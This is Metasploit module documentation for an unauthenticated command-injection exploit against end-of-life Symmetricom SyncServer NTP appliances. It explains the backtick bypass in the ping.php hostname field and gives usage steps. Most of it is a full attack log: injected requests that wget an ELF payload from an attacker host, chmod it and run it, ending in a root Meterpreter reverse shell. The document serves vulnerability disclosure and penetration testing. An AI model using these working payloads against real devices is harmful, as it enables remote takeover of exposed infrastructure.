## Vulnerable Application

Symmetricom SyncServer is a Network Time Protocol (NTP) hardware appliance.
The current supported version is the S600 series. This module targets the end of life S100
through S300 series which are still found in production and even exposed to the Internet at this time. 

The command injection vulnerability exists in the `hostname` parameter of `/controller/ping.php`.
No authentication is required due to a session handling vulnerability in affected versions which sends
a redirect to login yet still executes the command and displays the output if you ignore the redirect.
Only the first word of the command's output is displayed in the response. The following example request
would result in a response which includes `uid=0(root)`:

```
POST /controller/ping.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 149
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://127.0.0.1/controller/ping.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

currentTab=ping&refreshMode=&ethDirty=false&snmpCfgDirty=false&snmpTrapDirty=false&pingDirty=false&hostname=%60id%60&port=eth0&pingType=ping
```

The application strips out all known command injection characters except for backticks. In ping.php:

```
$hostnameEsc = preg_replace(
			array('/;/', '/\|/', '/>/', '/</', '/@/', '/\s/', '/!/', '/&/', '/\\\/' ),
            "",$hostname);
```

`/controller/ping.php` passes the filtered user input to `/usr/bin/ping.pl` which doesn't do any filtering:

```
{
  if (@ARGV == 3)
  {
    $cmdout = `$PING -c 5 -w 5 -I $ARGV[2] $ARGV[0] 2>&1`;
  }
  else
  {
    $cmdout = `$PING -c 5 -w 5 $ARGV[0] 2>&1`;
  }
}

...snip

print "$cmdout";
```

We believe that this vulnerability is the same as [CVE-2022-40022](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-40022). However, no details are published on this vulnerability other than vulnerability title and affected software version. We reached out to Microchip to ask if this is the same vulnerability and they have not responded at the time this was written.

## Verification Steps

Example steps:

1. Start msfconsole
2. Do: `use exploit/linux/http/symmetricom_syncserver_rce`
3. Do: `set RHOSTS [IP]`
4. Do: `set SRVHOST [IP]`
5. Do: `set SRVPORT [port]`
6. Do: `set LHOST [IP]`
7. Do: `set LPORT [port]`
8. Do: `check`
9. If the target is vulnerable:
10. Do: `exploit`
11. You should get a meterpreter shell

## Options

### FILENAME

The name of the payload to write.

#### Additional information

SRVHOST, SRVPORT, LHOST, and LPORT are required because a reverse shell is the only option for exploitation.
The server response to commands includes only the first word of output. Everything else is truncated
and you can't use the `>` character to write the command output to file, therefore this module implements
only a Meterpreter reverse shell.

The server is limited on ports which it can connect back to for the reverse shell. Ports 25 and 80 were successfully
used when developing this module.

## Scenarios

```
msf6 exploit(linux/http/symmetricom_syncserver_rce) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.143.50:25
msf6 exploit(linux/http/symmetricom_syncserver_rce) > [*] Using URL: http://192.168.143.50/payload.elf
[*] 192.168.143.222:80 - Exploit started...
[*] 192.168.143.222:80 - Sending wget command...
####################
# Request:
####################
POST /controller/ping.php HTTP/1.1
Host: 192.168.143.222
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 231

currentTab=ping&refreshMode=dirty&ethDirty=false&snmpCfgDirty=false&snmpTrapDirty=false&pingDirty=true&hostname=%60wget%24%7bIFS%7dhttp%3a//192.168.143.50/payload.elf%24%7bIFS%7d-O%24%7bIFS%7d/tmp/payload.elf%60&port=eth0&pingType=ping
[*] 192.168.143.222:80 - Payload request received: /payload.elf
####################
# Response:
####################
HTTP/1.1 302 Found
Date: Thu, 18 May 2023 14:13:53 GMT
Server: Apache
Set-Cookie: PHPSESSID=0943f04a12e46bb499725a4c2be0a9f3; path=/
Location: ../login.php
Transfer-Encoding: chunked
Content-Type: text/html

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>

<!--
/********************************************************************
*                                                                   *
*                   Copyright (C) 2005                              *
*                   Symmetricom, Inc.                               *
*                   All Rights Reserved                             *
*                                                                   *
********************************************************************/
-->
<title>Symmetricom SyncServer </title>
<link rel="stylesheet"  type="text/css" href="/fwk/css/basic2.css"></link>
<link rel="stylesheet"  type="text/css" href="/fwk/css/ipconfig2.css"></link>
<script langauge="JavaScript" src="/fwk/jsscript/tabs2.js"></script>
<script langauge="JavaScript" src="/fwk/jsscript/utils2.js"></script>
<script langauge="JavaScript" src="/fwk/jsscript/network2.js"></script>
<script langauge="JavaScript" src="/fwk/jsscript/snmp2.js"></script>
</head>
<script type="text/javascript">
initialtab     = [4,"ping"];
var browser         = "";
var browserVersion  = "";
var browserOS       = "";
var sessionRefresh  = 5000;
var syncModel       = "";
persist             = "";
checkNavigate       = true;
ajaxTimer                       = 0;
ajaxGlobalTimer     = 0;

var refreshTimer = setTimeout("doTimeout();", 5000);


function doTimeout()
{
    clearInterval(ajaxTimer);
    clearInterval(ajaxGlobalTimer);
        document.getElementById("heartbeatStatus").innerHTML = "System Monitor<br />Stopped";
    document.getElementById("boxTimeoutAlert").style.display="inline";
    document.getElementById("symbodyback").style.display="block";
}

tabIdNames          = new Array("ping");

var saveMode   = "add";
function initpage()
{

}
function pressApply()
{
     if(isEmptyStringValue(document.getElementById("hostname")))
     {
         alert("Must Specify Address to Ping");
         return;
     }
     document.form0.submit();
}
function pressCancel()
{
    document.getElementById("hostname").value="";
    setCurrentRadioMode("pingType", "ping")
    document.getElementById("port").value="eth0";
    setDialogDirty(true);
    disableApplyCancel();
}
function pressRefreshPage()
{
    document.getElementById("symbody").style.cursor = "wait";
    document.getElementById("symtop").style.cursor  = "wait";
    document.getElementById("refreshMode").value    = "true";
    document.form0.submit();
}

</script>
<script langauge="JavaScript" src="/controller/xml/lib/ajax.js"></script>
<script langauge="JavaScript" src="/controller/xml/lib/alarms.js"></script>
<script type="text/javascript">
        var pollTime = 5; // 5 second intervals (can be individually overridden)
        var url = '/controller/xml/status.php';
        var section = 'health';
        setTimeout("monitorGlobalDynamic(url,section,pollTime)", pollTime*1000);
</script>

<body id="symbody" class="bodyback">
<div id="symbodyback" class="bodybackhide" style="display:none;"></div>
<div class="symmtopend"></div>
<div id="symtop"
                        class="symmtop"></div>
<table class="maintable" cellpadding="0" cellspacing="0" style="width:800;">

<tr class="blankline"><td colspan="2">&nbsp;</td></tr>
<tr class="blankline"><td colspan="2">&nbsp;</td></tr>
<tr class="blankline"><td colspan="2">&nbsp;</td></tr>

<tr>
<td><div class="sidetabtopbody"></div></td>
<td valign="top">
<span id="globalLED"
                       class="greenLight" title="No Alarms"></span>
<span>
<a title="Click to View Alarms" href="javascript:statusbar();" id="msgLink"

                       class="statusNone"
                 onMouseOver="status='Click to View Alarms';return true;"
         onMouseLeave="status='';return true;"><span id="globalAlarm">No Current Major or Minor Alarms</span></a>
<input type="image" onClick="sideButton('logout')" src="/images/logtop.gif"
       alt="logout" name="logout" class="logoutbuttonnotab">

</td>
</tr><td width="20%" valign="top">
<div class="sidetabbody">
<table cellpadding="1" cellspacing="0">
<tr><td><input type="image" onClick="sideButtonWithCheck('status')"
         src="/images/status_dis.gif"          alt="Status" name="status" id="StatusButton">
</td></tr>
<tr><td><input type="image" onClick="sideButtonWithCheck('network')"
         src="/images/network.gif"
                  alt="Network"  name="network" id="NetworkButton">
</td></tr>
<tr><td><input type="image" onClick="sideButtonWithCheck('ntp')"
         src="/images/ntpside_dis.gif"         alt="NTP"  name="ntpMenu" id="NTPButton">
</td></tr>
<tr><td><input type="image" onClick="sideButtonWithCheck('timing')"
         src="/images/timing_dis.gif"          alt="Timing" name="timing" id="TimingButton">
</td></tr>
<tr><td><input type="image" onClick="sideButtonWithCheck('system')"
         src="/images/system_dis.gif"
         alt="System" name="system" id="SystemButton">
</td></tr>
<tr><td><input type="image" onClick="sideButtonWithCheck('admin')"
         src="/images/admin_dis.gif"
         alt="Admin" name="admin" id="AdminButton">
</td></tr>
<tr><td><input type="image" onClick="sideButtonWithCheck('services')"
         src="/images/services_dis.gif"
         alt="Services" name="servicess" id="ServicesButton">
</td></tr>
<tr><td><input type="image" onClick="sideButtonWithCheck('logs')"
         src="/images/logs_dis.gif"         alt="Logs" name="logs" id="LogsButton">
</td></tr>
<tr><td><input type="image" onClick="sideButtonWithCheck('wizards')"
        src="/images/wizards_dis.gif"         alt="Wizards" name="wizards" id="WizardsButton">
</td></tr>
<tr><td><input type="image" onClick="sideButtonWithCheck('help')"
         src="/images/help_dis.gif"
         alt="Help" name="help" id="HelpButton">
</td></tr>
<tr><td align="center" id="ajaxmonitor">
        <br />  <span id="heartbeatStatus" style="display:none;font:11px Arial;font-weight:bold;margin-top:0px;color:yellow;">
                        System Monitor<br />Active
        </span>
</td></tr>
</table>
</div>
</td><form name="form0" accept-charset="UNKNOWN" method="POST"
      action="ping.php" enctype="application/x-www-form-urlencoded">
<td width="70%">
<div id="ddimagetabs">
<a title="Configuration of Ethernet Ports and Networking Model" href="javascript:changeLink('network');" id="NetworkEthernetTab"
            onMouseLeave="status=' ';return true;"
        onMouseOver="status='Base Ethernet onfiguration for all Ports';return true;">Ethernet</a>
<a title="Primary SNMP Configuration" href="javascript:changeLink('snmp');" id="NetworkSNMPTab"
                onMouseLeave="status=' ';return true;"
        onMouseOver="status='V1 SNMP Community Setup and V3 Users ';return true;">SNMP</a>
<a title="SNMP Trap and Inform Configuration" href="javascript:changeLink('traps');" id="NetworkSNMPTrapsTab"
            onMouseLeave="status=' ';return true;"
        onMouseOver="status='V1 Trap and V3 Inform Setup';return true;">SNMP Traps</a>
<a title="Ping Specified Address" href="javascript:changeLink('ping');" id="NetworkPingTab"
            onMouseLeave="status=' ';return true;"
        onMouseOver="status='Ping Address to verify Network Connections';return true;">Ping</a>
<input type="hidden" name="currentTab" id="currentTab" value="ping">
</div><input type="hidden" name="refreshMode" id="refreshMode" value="">
<DIV id="tabcontentcontainer">
<div class="tabtop"></div>
<div id="eth" class="tabcontent">
<input type="hidden" name='ethDirty'
       id='ethDirty'  value="false">
</div>
<div id="snmpCfg" class="tabcontent">
<input type="hidden" name='snmpCfgDirty'
       id='snmpCfgDirty' value="false">
</div>
<div id="snmpTrap" class="tabcontent">
<input type="hidden" name='snmpTrapDirty'
       id='snmpTrapDirty' value="false">
</div>
<div id="ping" class="tabcontent">
<input type="hidden" name='pingDirty'
       id='pingDirty' value="false">
<div class="ipBorder">
<div class="tabFontHead">Network Ping Test</div>
<table class="tabfont" width="100%"  cellpadding="0" cellspacing="0">
<col width="15%"><col width="2%"><col width="45%">
<tr><td>&nbsp;</td></tr>
<tr><td>&nbsp;</td></tr>
<tr>
      <td><div class="tabfontlabel">Ping -c 5 -w 5</div></td>
      <td>&nbsp;</td>
      <td>
          <input name="hostname" id="hostname" type="text" size="38" maxlength="64"
                 class="formEditNosize" value="`wget${IFS}http://192.168.143.50/payload.elf${IFS}-O${IFS}/tmp/payload.elf`" onClick="dialogInput();">
      </td>
      <td>
          <select id ="port" name="port"  class="formEditNosize" onChange="dialogInput();">
                        <option value="eth0"
            selected>LAN1
            </option>
                      </select>
      </td>
      <td>
         <input type="radio" name="pingType" id="ping"
             value="ping" checked onClick="dialogInput();" checked>
          <span class="tabFontBold">Ping</span>
          <input type="radio" name="pingType" id="ping6"
             value="ping6" onClick="dialogInput();"  >
          <span class="tabFontBold">Ping6</span>

      </td>
</tr>
<tr><td>&nbsp;</td></tr>
</table>
<table class="pingHeader" width="100%" cellspacing="1" cellpadding="0">
<span class="pingScrollEnd"></span>
<col width="100%">
<tr>
      <th class="pingScrollTitle">Ping Output</th>
</tr>
</table>
<div id="pingList" class="pingScrollList">
<table class="tabfont" width="100%"  cellspacing="1" cellpadding="0">
<col width="100%">
<tr>
<td class="stategood">Usage: ping [-LRUbdfnqrvVaA] [-c count] [-i interval] [-w deadline]</td>
</tr>
<tr>
<td class="stategood">            [-p pattern] [-s packetsize] [-t ttl] [-I interface or address]</td>
</tr>
<tr>
<td class="stategood">            [-M mtu discovery hint] [-S sndbuf]</td>
</tr>
<tr>
<td class="stategood">            [ -T timestamp option ] [ -Q tos ] [hop1 ...] destination</td>
</tr>
</table>
</div>
</div>
</div>












<div id="tabFooter"><!-- Outer Container-->

<div id="footerButtons" class="">
        <span id="dialogapplybutton">
      <img border="0"
                src="/images/apply_dis.gif" style="cursor:not-allowed" disabled
            alt="Apply" id="apply" title="Apply Pending Changes"
      onClick="pressApply();">
</span>

        <span id="dialogcancelbutton">
      <img border="0"
                src="/images/cancel_dis.gif" style="cursor:not-allowed" disabled
            alt="Cancel" id="cancel" title="Cancel Pending Changes"
      onClick="pressCancel();">
</span>

        <span id="dialogdonebutton" style="display:none">
      <img border="0"
      src="/images/done.gif" style="cursor:pointer";
      alt="Done" id="done" title="Finish Current Operation"
      onClick="pressCancel();">
</span>


</div><!-- End FooterButtons Div -->
<div id="footerMessage">
        <span id="dialogokmessage" class="dialogoklabel">Pinging \`wget\$\{IFS\}http://192.168.143.50/payload.elf\$\{IFS\}-O\$\{IFS\}/tmp/payload.elf\`&nbsp;</span>
        <span id="dialogerrormessage" class="dialogerrorlabel">&nbsp;</span>
</div>

</div><!-- End outer container -->

<div id="iconButtons">
               <img  border="0"
           src="/images/helpicon.gif" style="cursor:pointer";
           alt="pagehelp" id="pagehelp" title="Help" onClick="pressHelpPage();">
               <img  border="0"
           src="/images/refreshicon.gif" style="cursor:pointer";
           alt="pagerefresh" id="pagerefresh" title="Refresh" onClick="pressRefreshPage();">
</div>




</form>
</td>
</tr>
<tr>
<td valign="top"><div class="sidetabbottombody"></div></td>
<td valign="top"><div class="tabbottom"></div></td>
</tr>
</table>

<div style="display:none;left:200px;top:200px;" id="boxTimeoutAlert" class="boxWaitShadow">
        <div id="boxTimeoutNotice" class="boxWait">
                <div class="tabfonthead" id="modalLabelTimeout"
                        style="margin:50px 10px;text-align:center;background-color:#E6E7E8;">
                                Your session has timed-out.<br /><br />
                                <a href="/">Return to Login page</a>
                </div>
        </div>
</div>

</body>
</html></body>
</html>

[*] 192.168.143.222:80 - Making payload executable...
####################
# Request:
####################
POST /controller/ping.php HTTP/1.1
Host: 192.168.143.222
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 190

currentTab=ping&refreshMode=dirty&ethDirty=false&snmpCfgDirty=false&snmpTrapDirty=false&pingDirty=true&hostname=%60chmod%24%7bIFS%7d700%24%7bIFS%7d/tmp/payload.elf%60&port=eth0&pingType=ping
####################
# Response:
####################
HTTP/1.1 302 Found
Date: Thu, 18 May 2023 14:13:56 GMT
Server: Apache
Set-Cookie: PHPSESSID=92c047aa2d8aaadbfce5ce671817ef74; path=/
Location: ../login.php
Transfer-Encoding: chunked
Content-Type: text/html

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>

<!--
/********************************************************************
*                                                                   *
*                   Copyright (C) 2005                              *
*                   Symmetricom, Inc.                               *
*                   All Rights Reserved                             *
*                                                                   *
********************************************************************/
-->
<title>Symmetricom SyncServer </title>
<link rel="stylesheet"  type="text/css" href="/fwk/css/basic2.css"></link>
<link rel="stylesheet"  type="text/css" href="/fwk/css/ipconfig2.css"></link>
<script langauge="JavaScript" src="/fwk/jsscript/tabs2.js"></script>
<script langauge="JavaScript" src="/fwk/jsscript/utils2.js"></script>
<script langauge="JavaScript" src="/fwk/jsscript/network2.js"></script>
<script langauge="JavaScript" src="/fwk/jsscript/snmp2.js"></script>
</head>
<script type="text/javascript">
initialtab     = [4,"ping"];
var browser         = "";
var browserVersion  = "";
var browserOS       = "";
var sessionRefresh  = 5000;
var syncModel       = "";
persist             = "";
checkNavigate       = true;
ajaxTimer                       = 0;
ajaxGlobalTimer     = 0;

var refreshTimer = setTimeout("doTimeout();", 5000);


function doTimeout()
{
    clearInterval(ajaxTimer);
    clearInterval(ajaxGlobalTimer);
        document.getElementById("heartbeatStatus").innerHTML = "System Monitor<br />Stopped";
    document.getElementById("boxTimeoutAlert").style.display="inline";
    document.getElementById("symbodyback").style.display="block";
}

tabIdNames          = new Array("ping");

var saveMode   = "add";
function initpage()
{

}
function pressApply()
{
     if(isEmptyStringValue(document.getElementById("hostname")))
     {
         alert("Must Specify Address to Ping");
         return;
     }
     document.form0.submit();
}
function pressCancel()
{
    document.getElementById("hostname").value="";
    setCurrentRadioMode("pingType", "ping")
    document.getElementById("port").value="eth0";
    setDialogDirty(true);
    disableApplyCancel();
}
function pressRefreshPage()
{
    document.getElementById("symbody").style.cursor = "wait";
    document.getElementById("symtop").style.cursor  = "wait";
    document.getElementById("refreshMode").value    = "true";
    document.form0.submit();
}

</script>
<script langauge="JavaScript" src="/controller/xml/lib/ajax.js"></script>
<script langauge="JavaScript" src="/controller/xml/lib/alarms.js"></script>
<script type="text/javascript">
        var pollTime = 5; // 5 second intervals (can be individually overridden)
        var url = '/controller/xml/status.php';
        var section = 'health';
        setTimeout("monitorGlobalDynamic(url,section,pollTime)", pollTime*1000);
</script>

<body id="symbody" class="bodyback">
<div id="symbodyback" class="bodybackhide" style="display:none;"></div>
<div class="symmtopend"></div>
<div id="symtop"
                        class="symmtop"></div>
<table class="maintable" cellpadding="0" cellspacing="0" style="width:800;">

<tr class="blankline"><td colspan="2">&nbsp;</td></tr>
<tr class="blankline"><td colspan="2">&nbsp;</td></tr>
<tr class="blankline"><td colspan="2">&nbsp;</td></tr>

<tr>
<td><div class="sidetabtopbody"></div></td>
<td valign="top">
<span id="globalLED"
                       class="greenLight" title="No Alarms"></span>
<span>
<a title="Click to View Alarms" href="javascript:statusbar();" id="msgLink"

                       class="statusNone"
                 onMouseOver="status='Click to View Alarms';return true;"
         onMouseLeave="status='';return true;"><span id="globalAlarm">No Current Major or Minor Alarms</span></a>
<input type="image" onClick="sideButton('logout')" src="/images/logtop.gif"
       alt="logout" name="logout" class="logoutbuttonnotab">

</td>
</tr><td width="20%" valign="top">
<div class="sidetabbody">
<table cellpadding="1" cellspacing="0">
<tr><td><input type="image" onClick="sideButtonWithCheck('status')"
         src="/images/status_dis.gif"          alt="Status" name="status" id="StatusButton">
</td></tr>
<tr><td><input type="image" onClick="sideButtonWithCheck('network')"
         src="/images/network.gif"
                  alt="Network"  name="network" id="NetworkButton">
</td></tr>
<tr><td><input type="image" onClick="sideButtonWithCheck('ntp')"
         src="/images/ntpside_dis.gif"         alt="NTP"  name="ntpMenu" id="NTPButton">
</td></tr>
<tr><td><input type="image" onClick="sideButtonWithCheck('timing')"
         src="/images/timing_dis.gif"          alt="Timing" name="timing" id="TimingButton">
</td></tr>
<tr><td><input type="image" onClick="sideButtonWithCheck('system')"
         src="/images/system_dis.gif"
         alt="System" name="system" id="SystemButton">
</td></tr>
<tr><td><input type="image" onClick="sideButtonWithCheck('admin')"
         src="/images/admin_dis.gif"
         alt="Admin" name="admin" id="AdminButton">
</td></tr>
<tr><td><input type="image" onClick="sideButtonWithCheck('services')"
         src="/images/services_dis.gif"
         alt="Services" name="servicess" id="ServicesButton">
</td></tr>
<tr><td><input type="image" onClick="sideButtonWithCheck('logs')"
         src="/images/logs_dis.gif"         alt="Logs" name="logs" id="LogsButton">
</td></tr>
<tr><td><input type="image" onClick="sideButtonWithCheck('wizards')"
        src="/images/wizards_dis.gif"         alt="Wizards" name="wizards" id="WizardsButton">
</td></tr>
<tr><td><input type="image" onClick="sideButtonWithCheck('help')"
         src="/images/help_dis.gif"
         alt="Help" name="help" id="HelpButton">
</td></tr>
<tr><td align="center" id="ajaxmonitor">
        <br />  <span id="heartbeatStatus" style="display:none;font:11px Arial;font-weight:bold;margin-top:0px;color:yellow;">
                        System Monitor<br />Active
        </span>
</td></tr>
</table>
</div>
</td><form name="form0" accept-charset="UNKNOWN" method="POST"
      action="ping.php" enctype="application/x-www-form-urlencoded">
<td width="70%">
<div id="ddimagetabs">
<a title="Configuration of Ethernet Ports and Networking Model" href="javascript:changeLink('network');" id="NetworkEthernetTab"
            onMouseLeave="status=' ';return true;"
        onMouseOver="status='Base Ethernet onfiguration for all Ports';return true;">Ethernet</a>
<a title="Primary SNMP Configuration" href="javascript:changeLink('snmp');" id="NetworkSNMPTab"
                onMouseLeave="status=' ';return true;"
        onMouseOver="status='V1 SNMP Community Setup and V3 Users ';return true;">SNMP</a>
<a title="SNMP Trap and Inform Configuration" href="javascript:changeLink('traps');" id="NetworkSNMPTrapsTab"
            onMouseLeave="status=' ';return true;"
        onMouseOver="status='V1 Trap and V3 Inform Setup';return true;">SNMP Traps</a>
<a title="Ping Specified Address" href="javascript:changeLink('ping');" id="NetworkPingTab"
            onMouseLeave="status=' ';return true;"
        onMouseOver="status='Ping Address to verify Network Connections';return true;">Ping</a>
<input type="hidden" name="currentTab" id="currentTab" value="ping">
</div><input type="hidden" name="refreshMode" id="refreshMode" value="">
<DIV id="tabcontentcontainer">
<div class="tabtop"></div>
<div id="eth" class="tabcontent">
<input type="hidden" name='ethDirty'
       id='ethDirty'  value="false">
</div>
<div id="snmpCfg" class="tabcontent">
<input type="hidden" name='snmpCfgDirty'
       id='snmpCfgDirty' value="false">
</div>
<div id="snmpTrap" class="tabcontent">
<input type="hidden" name='snmpTrapDirty'
       id='snmpTrapDirty' value="false">
</div>
<div id="ping" class="tabcontent">
<input type="hidden" name='pingDirty'
       id='pingDirty' value="false">
<div class="ipBorder">
<div class="tabFontHead">Network Ping Test</div>
<table class="tabfont" width="100%"  cellpadding="0" cellspacing="0">
<col width="15%"><col width="2%"><col width="45%">
<tr><td>&nbsp;</td></tr>
<tr><td>&nbsp;</td></tr>
<tr>
      <td><div class="tabfontlabel">Ping -c 5 -w 5</div></td>
      <td>&nbsp;</td>
      <td>
          <input name="hostname" id="hostname" type="text" size="38" maxlength="64"
                 class="formEditNosize" value="`chmod${IFS}700${IFS}/tmp/payload.elf`" onClick="dialogInput();">
      </td>
      <td>
          <select id ="port" name="port"  class="formEditNosize" onChange="dialogInput();">
                        <option value="eth0"
            selected>LAN1
            </option>
                      </select>
      </td>
      <td>
         <input type="radio" name="pingType" id="ping"
             value="ping" checked onClick="dialogInput();" checked>
          <span class="tabFontBold">Ping</span>
          <input type="radio" name="pingType" id="ping6"
             value="ping6" onClick="dialogInput();"  >
          <span class="tabFontBold">Ping6</span>

      </td>
</tr>
<tr><td>&nbsp;</td></tr>
</table>
<table class="pingHeader" width="100%" cellspacing="1" cellpadding="0">
<span class="pingScrollEnd"></span>
<col width="100%">
<tr>
      <th class="pingScrollTitle">Ping Output</th>
</tr>
</table>
<div id="pingList" class="pingScrollList">
<table class="tabfont" width="100%"  cellspacing="1" cellpadding="0">
<col width="100%">
<tr>
<td class="stategood">Usage: ping [-LRUbdfnqrvVaA] [-c count] [-i interval] [-w deadline]</td>
</tr>
<tr>
<td class="stategood">            [-p pattern] [-s packetsize] [-t ttl] [-I interface or address]</td>
</tr>
<tr>
<td class="stategood">            [-M mtu discovery hint] [-S sndbuf]</td>
</tr>
<tr>
<td class="stategood">            [ -T timestamp option ] [ -Q tos ] [hop1 ...] destination</td>
</tr>
</table>
</div>
</div>
</div>












<div id="tabFooter"><!-- Outer Container-->

<div id="footerButtons" class="">
        <span id="dialogapplybutton">
      <img border="0"
                src="/images/apply_dis.gif" style="cursor:not-allowed" disabled
            alt="Apply" id="apply" title="Apply Pending Changes"
      onClick="pressApply();">
</span>

        <span id="dialogcancelbutton">
      <img border="0"
                src="/images/cancel_dis.gif" style="cursor:not-allowed" disabled
            alt="Cancel" id="cancel" title="Cancel Pending Changes"
      onClick="pressCancel();">
</span>

        <span id="dialogdonebutton" style="display:none">
      <img border="0"
      src="/images/done.gif" style="cursor:pointer";
      alt="Done" id="done" title="Finish Current Operation"
      onClick="pressCancel();">
</span>


</div><!-- End FooterButtons Div -->
<div id="footerMessage">
        <span id="dialogokmessage" class="dialogoklabel">Pinging \`chmod\$\{IFS\}700\$\{IFS\}/tmp/payload.elf\`&nbsp;</span>
        <span id="dialogerrormessage" class="dialogerrorlabel">&nbsp;</span>
</div>

</div><!-- End outer container -->

<div id="iconButtons">
               <img  border="0"
           src="/images/helpicon.gif" style="cursor:pointer";
           alt="pagehelp" id="pagehelp" title="Help" onClick="pressHelpPage();">
               <img  border="0"
           src="/images/refreshicon.gif" style="cursor:pointer";
           alt="pagerefresh" id="pagerefresh" title="Refresh" onClick="pressRefreshPage();">
</div>




</form>
</td>
</tr>
<tr>
<td valign="top"><div class="sidetabbottombody"></div></td>
<td valign="top"><div class="tabbottom"></div></td>
</tr>
</table>

<div style="display:none;left:200px;top:200px;" id="boxTimeoutAlert" class="boxWaitShadow">
        <div id="boxTimeoutNotice" class="boxWait">
                <div class="tabfonthead" id="modalLabelTimeout"
                        style="margin:50px 10px;text-align:center;background-color:#E6E7E8;">
                                Your session has timed-out.<br /><br />
                                <a href="/">Return to Login page</a>
                </div>
        </div>
</div>

</body>
</html></body>
</html>

[*] 192.168.143.222:80 - Executing payload...
####################
# Request:
####################
POST /controller/ping.php HTTP/1.1
Host: 192.168.143.222
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 158

currentTab=ping&refreshMode=dirty&ethDirty=false&snmpCfgDirty=false&snmpTrapDirty=false&pingDirty=true&hostname=%60/tmp/payload.elf%60&port=eth0&pingType=ping
[*] Transmitting intermediate stager...(106 bytes)
[*] Sending stage (1017704 bytes) to 192.168.143.222
[*] Meterpreter session 1 opened (192.168.143.50:25 -> 192.168.143.222:52474) at 2023-05-18 10:14:04 -0400

msf6 exploit(linux/http/symmetricom_syncserver_rce) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: root
meterpreter >
####################
# Response:
####################
No response received
[*] Server stopped.

meterpreter >

```
